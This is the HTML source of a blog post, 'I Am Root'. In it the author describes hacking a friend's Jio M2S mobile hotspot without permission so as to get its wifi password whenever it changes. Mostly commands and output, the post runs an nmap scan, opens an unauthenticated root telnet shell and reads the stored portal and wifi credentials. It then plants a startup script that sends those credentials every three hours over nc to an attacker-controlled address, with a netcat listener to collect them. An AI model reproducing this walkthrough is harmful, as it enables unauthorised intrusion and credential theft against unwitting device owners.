@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>I Am Root - Omer&#39;s Blog</title><meta name="Description" content="This my personal blog where I write about Tech"><meta property="og:title" content="I Am Root" />
+<meta property="og:description" content="I Am Root Intro Lately a friend of mine in the neighboring dorm has bought these little devices which act as a mobile hotspot and he sometimes shares the passwords with a select group of people
+jio m2s And my natural cruiosity would not rest until I have away to gain access to this network when ever I want to.
+Since I don&rsquo;t have the time or patience to run john or hashcat I started thinking of other ways to gain access to the network as I said before he sometimes shares his password with selected group of people." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://omer-biz.github.io/posts/i-am-root/" /><meta property="og:image" content="https://omer-biz.github.io/posts/i-am-root/featured-image.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-08T10:50:34+03:00" />
+<meta property="article:modified_time" content="2021-09-08T10:50:34+03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://omer-biz.github.io/posts/i-am-root/featured-image.jpg"/>
+<meta name="twitter:title" content="I Am Root"/>
+<meta name="twitter:description" content="I Am Root Intro Lately a friend of mine in the neighboring dorm has bought these little devices which act as a mobile hotspot and he sometimes shares the passwords with a select group of people
+jio m2s And my natural cruiosity would not rest until I have away to gain access to this network when ever I want to.
+Since I don&rsquo;t have the time or patience to run john or hashcat I started thinking of other ways to gain access to the network as I said before he sometimes shares his password with selected group of people."/>
+<meta name="application-name" content="Th3Librarin">
+<meta name="apple-mobile-web-app-title" content="Th3Librarin"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://omer-biz.github.io/posts/i-am-root/" /><link rel="prev" href="https://omer-biz.github.io/posts/behemoth-2-overthewire/" /><link rel="next" href="https://omer-biz.github.io/posts/space-htb/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "I Am Root",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/omer-biz.github.io\/posts\/i-am-root\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/omer-biz.github.io\/posts\/i-am-root\/featured-image.jpg",
+                            "width":  1311 ,
+                            "height":  704 
+                        }],"genre": "posts","wordcount":  1258 ,
+        "url": "https:\/\/omer-biz.github.io\/posts\/i-am-root\/","datePublished": "2021-09-08T10:50:34+03:00","dateModified": "2021-09-08T10:50:34+03:00","publisher": {
+            "@type": "Organization",
+            "name": "Omer"},"author": {
+                "@type": "Person",
+                "name": "Omer"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Home Page"> Home </a><a class="menu-item" href="/posts/" title="Blog Posts"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about" title="About"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Home Page">Home</a><a class="menu-item" href="/posts/" title="Blog Posts">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="About">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">I Am Root</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Omer</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-08">2021-09-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1258 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/i-am-root/featured-image.jpg"
+        data-srcset="/posts/i-am-root/featured-image.jpg, /posts/i-am-root/featured-image.jpg 1.5x, /posts/i-am-root/featured-image.jpg 2x"
+        data-sizes="auto"
+        alt="/posts/i-am-root/featured-image.jpg"
+        title="/posts/i-am-root/featured-image.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#getting-a-shell-very-easy">Getting a shell (very easy)</a></li>
+    <li><a href="#lets-go-hunting">Let&rsquo;s go hunting</a></li>
+    <li><a href="#persistence">Persistence</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="i-am-root">I Am Root</h1>
+<h2 id="intro">Intro</h2>
+<p>Lately a friend of mine in the neighboring dorm has bought these little devices
+which act as a mobile hotspot and he sometimes shares the passwords with a
+select group of people</p>
+<figure><img src="./device.jpg" width="320"/><figcaption>
+            <h4>jio m2s</h4>
+        </figcaption>
+</figure>
+
+<p>And my natural cruiosity would not rest until I have away to gain access to this
+network when ever I want to.</p>
+<p>Since I don&rsquo;t have the time or patience to run <code>john</code> or <code>hashcat</code> I started
+thinking of other ways to gain access to the network as I said before he sometimes
+shares his password with selected group of people. So social engineering is
+enough to get the wifi password, but the problem is when he changes the password
+and doesn&rsquo;t share the passowrd with anyone else so I had to come up with a plan
+where I can get the password every time he changes the password.</p>
+<p>Basically persistence, I will get back to this later.</p>
+<h2 id="recon">Recon</h2>
+<p>Now let&rsquo;s run nmap on the
+wifi hotspot device and see what we have.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">~ &gt; sudo nmap -sV -sC -T4 --min-rate=1000 192.168.1.1
+</span></span><span class="line"><span class="cl">[sudo] password for omer:
+</span></span><span class="line"><span class="cl">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-29 14:46 EAT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.1.1
+</span></span><span class="line"><span class="cl">Host is up (0.018s latency).
+</span></span><span class="line"><span class="cl">Not shown: 993 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
+</span></span><span class="line"><span class="cl">| ftp-syst:
+</span></span><span class="line"><span class="cl">|   STAT:
+</span></span><span class="line"><span class="cl">| Server status:
+</span></span><span class="line"><span class="cl">|  TYPE: BINARY
+</span></span><span class="line"><span class="cl">|_Ok
+</span></span><span class="line"><span class="cl">|_ftp-bounce: bounce working!
+</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class="line"><span class="cl">| total 8
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    3 root     root           224 Feb 16  2017 WEBSERVER
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    8 root     root           608 Jan  1  1970 app
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 root     root         15664 Feb 16  2017 bin
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 root     root           160 Feb 16  2017 boot
+</span></span><span class="line"><span class="cl">| -rw-r--r--    1 root     root           128 Feb 16  2017 build.prop
+</span></span><span class="line"><span class="cl">| lrwxrwxrwx    1 root     root            14 Jan  5  1970 cache -&gt; /ww_bata/cache
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 root     root           160 Feb 16  2017 data
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    8 root     root          4620 Jan  5  1970 dev
+</span></span><span class="line"><span class="cl">| drwxr-xr-x   23 root     root          4968 Jan  5  1970 etc
+</span></span><span class="line"><span class="cl">| drwxrwxr-x    3 1000     1000           224 Feb 16  2017 firmware
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    3 root     root           224 Feb 16  2017 home
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    3 root     root          2344 Jan  1  1970 lib
+</span></span><span class="line"><span class="cl">| lrwxrwxrwx    1 root     root            12 Feb 16  2017 linuxrc -&gt; /bin/busybox
+</span></span><span class="line"><span class="cl">| drwxr-xr-x   10 root     root           680 Feb 16  2017 media
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 root     root           160 Feb 16  2017 mnt
+</span></span><span class="line"><span class="cl">| dr-xr-xr-x  145 root     root             0 Jan  1  1970 proc
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    4 root     root           200 Jan  5  1970 run
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    3 root     root          9040 Feb 16  2017 sbin
+</span></span><span class="line"><span class="cl">| lrwxrwxrwx    1 root     root            11 Feb 16  2017 sdcard -&gt; /media/card
+</span></span><span class="line"><span class="cl">|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+</span></span><span class="line"><span class="cl">23/tcp    open  telnet
+</span></span><span class="line"><span class="cl">| fingerprint-strings:
+</span></span><span class="line"><span class="cl">|   GenericLines, NULL, RPCCheck:
+</span></span><span class="line"><span class="cl">|     201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">|   GetRequest:
+</span></span><span class="line"><span class="cl">|     201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">|     HTTP/1.0
+</span></span><span class="line"><span class="cl">|     HTTP/1.0
+</span></span><span class="line"><span class="cl">|     /bin/sh: GET: not found
+</span></span><span class="line"><span class="cl">|   Help:
+</span></span><span class="line"><span class="cl">|     201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">|     HELP
+</span></span><span class="line"><span class="cl">|     HELP
+</span></span><span class="line"><span class="cl">|     /bin/sh: HELP: not found
+</span></span><span class="line"><span class="cl">|   SIPOptions:
+</span></span><span class="line"><span class="cl">|     201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">|     OPTIONS sip:nm SIP/2.0
+</span></span><span class="line"><span class="cl">|     Via: SIP/2.0/TCP nm;branch=foo
+</span></span><span class="line"><span class="cl">|     From: &lt;sip:nm@nm&gt;;tag=root
+</span></span><span class="line"><span class="cl">|     &lt;sip:nm2@nm2&gt;
+</span></span><span class="line"><span class="cl">|     Call-ID: 50000
+</span></span><span class="line"><span class="cl">|     CSeq: 42 OPTIONS
+</span></span><span class="line"><span class="cl">|     Max-Forwards: 70
+</span></span><span class="line"><span class="cl">|     Content-Length: 0
+</span></span><span class="line"><span class="cl">|     Contact: &lt;sip:nm@nm&gt;
+</span></span><span class="line"><span class="cl">|     Accept: application/sdp
+</span></span><span class="line"><span class="cl">|     OPTIONS sip:nm SIP/2.0
+</span></span><span class="line"><span class="cl">|     /bin/sh: OPTIONS: not found
+</span></span><span class="line"><span class="cl">|     Via: SIP/2.0/TCP nm;branch=foo
+</span></span><span class="line"><span class="cl">|     /bin/sh: Via:: not found
+</span></span><span class="line"><span class="cl">|     From: &lt;sip:nm@nm&gt;;tag=root
+</span></span><span class="line"><span class="cl">|     /bin/sh: syntax error: unexpected &#34;;&#34;
+</span></span><span class="line"><span class="cl">|     &lt;sip:nm2@nm2&gt;
+</span></span><span class="line"><span class="cl">|     /bin/sh: syntax error: unexpected newline
+</span></span><span class="line"><span class="cl">|     Call-ID: 50000
+</span></span><span class="line"><span class="cl">|     /bin/sh: Call-ID:: not found
+</span></span><span class="line"><span class="cl">|     CSeq: 42 OPTIONS
+</span></span><span class="line"><span class="cl">|     /bin/sh: CSeq:: not found
+</span></span><span class="line"><span class="cl">|     Max-Forwards: 70
+</span></span><span class="line"><span class="cl">|     /bin/sh: Max-Forwards:: not found
+</span></span><span class="line"><span class="cl">|     Content-Length: 0
+</span></span><span class="line"><span class="cl">|     /bin/sh: Content-Length:: not found
+</span></span><span class="line"><span class="cl">|     Contact: &lt;sip:nm@nm&gt;
+</span></span><span class="line"><span class="cl">|     /bin/sh: syntax error: unexpected newline
+</span></span><span class="line"><span class="cl">|     Accept: application/sdp
+</span></span><span class="line"><span class="cl">|     /bin/sh: Accept:: not found
+</span></span><span class="line"><span class="cl">|     201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">|     ^@IBM-3279-4-E
+</span></span><span class="line"><span class="cl">|_    ?IBM-3279-4-E?
+</span></span><span class="line"><span class="cl">53/tcp    open  domain  dnsmasq 2.76
+</span></span><span class="line"><span class="cl">| dns-nsid:
+</span></span><span class="line"><span class="cl">|_  bind.version: dnsmasq-2.76
+</span></span><span class="line"><span class="cl">80/tcp    open  http    Boa HTTPd 0.94.14rc21
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://jiofi.local.html
+</span></span><span class="line"><span class="cl">|_http-server-header: Boa/0.94.14rc21
+</span></span><span class="line"><span class="cl">6666/tcp  open  achat   AChat chat system
+</span></span><span class="line"><span class="cl">7777/tcp  open  achat   AChat chat system
+</span></span><span class="line"><span class="cl">52869/tcp open  upnp    MiniUPnP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="getting-a-shell-very-easy">Getting a shell (very easy)</h2>
+<p>We have a bunch of open ports. <code>Nmap</code> also tells us that anonymous ftp login is possible.
+Learning this, I went for telnet and surprisingly enough it doesn&rsquo;t ask for any credentials.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">~ &gt; telnet 192.168.1.1 23
+</span></span><span class="line"><span class="cl">Trying 192.168.1.1...
+</span></span><span class="line"><span class="cl">Connected to 192.168.1.1.
+</span></span><span class="line"><span class="cl">Escape character is &#39;^]&#39;.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msm 201702161506 mdm9607-perf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/ # ls
+</span></span><span class="line"><span class="cl">WEBSERVER   build.prop  etc         linuxrc     run         system      var
+</span></span><span class="line"><span class="cl">app         cache       firmware    media       sbin        target      webui
+</span></span><span class="line"><span class="cl">bin         data        home        mnt         sdcard      tmp         ww_bata
+</span></span><span class="line"><span class="cl">boot        dev         lib         proc        sys         usr         ww_data
+</span></span><span class="line"><span class="cl">/ #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If you have a keen eyes, you will notice the <code>#</code> symbol which is a symbol used to
+indicate that you are a root user to double check this I had to run the <code>id</code> command.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/ # id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Seems like in deeded we are root we can do what ever we want.</p>
+<h2 id="lets-go-hunting">Let&rsquo;s go hunting</h2>
+<p>My first hunt was for the wifi password. Since this is a Linux box we can use
+<code>grep</code> to search for text in files.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/ # grep -r -e security -f /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>-r</code> is for recursive, <code>-e</code> is the pattern to search for, <code>-f</code> is where to
+search the pattern from.</p>
+<p>Since I don&rsquo;t know the web portals username and password and the <code>grep</code> command was also
+taking too long. I started searching manually. I found all of them in the <code>/ww_data/nv</code>
+directory.</p>
+<ul>
+<li>The web portals username can be found in <code>user_name</code> file.</li>
+<li>The web portals password can be found in <code>user_password</code> file.</li>
+<li>The wifi passowrd is in the <code>wlan_wpa_psk</code> file.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/ # cd /ww_data/nv
+</span></span><span class="line"><span class="cl">/ww_data/nv # cat user_name; echo
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">/ww_data/nv # cat user_password; echo
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">/ww_data/nv # cat wlan_wpa_psk; echo
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">/ww_data/nv #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="persistence">Persistence</h2>
+<p>Now comes the persistence part. My plan was to write simple POSIX shell script
+and make it run at start up. The script will send the above credentials to a
+central server I control. To see if I could access the internet through
+the telnet shell, I could run a <code>ping</code> command.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/ww_data/nv # ping www.google.com
+</span></span><span class="line"><span class="cl">PING www.google.com (142.250.185.36): 56 data bytes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get a response which means we can access the internet.
+I learned from this <a href="https://unix.stackexchange.com/questions/244060/run-script-on-startup-for-old-linux-kernel-3-0-0" target="_blank" rel="noopener noreffer">stackexchange questions</a>
+how to run script on startup. The <code>/etc/rc5.d/S99appautorun.sh</code> file is executed on
+startup. We can source our custom script from here.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> sleep 3h
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">data</span><span class="o">=</span><span class="s2">&#34;username: </span><span class="k">$(</span>cat /ww_data/nv/user_name<span class="k">)</span><span class="s2">\npassword: </span><span class="k">$(</span>cat /ww_data/nv/user_password<span class="k">)</span><span class="s2">\nwifi_password: </span><span class="k">$(</span>cat /ww_data/nv/wlan_wpa_psk<span class="k">)</span><span class="s2">\nwifi_name: </span><span class="k">$(</span>cat /ww_data/nv/wlan_ssid<span class="k">)</span><span class="s2">\n&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="nv">$data</span> <span class="p">|</span> nc &lt;ip&gt; &lt;port&gt;
+</span></span><span class="line"><span class="cl"><span class="k">done</span> <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This script will be sending the credentials to the specified <code>&lt;ip&gt;</code>, and <code>&lt;port&gt;</code>
+every 3 hour. All we have to do now is
+source it in the <code>/etc/rc5.d/S99appautorun.sh</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> /path_to_script/script.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To setup the server all you have to do is.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ nc -lnvp &lt;port&gt; <span class="p">|</span> tee creds.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we are done. Thank you for reading :)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-09-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://omer-biz.github.io/posts/i-am-root/" data-title="I Am Root" data-via="@th3_librarian"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://omer-biz.github.io/posts/i-am-root/"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/behemoth-2-overthewire/" class="prev" rel="prev" title="Behemoth 2 - OverTheWire"><i class="fas fa-angle-left fa-fw"></i>Behemoth 2 - OverTheWire</a>
+            <a href="/posts/space-htb/" class="next" rel="next" title="Space | HackTheBox">Space | HackTheBox<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.109.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
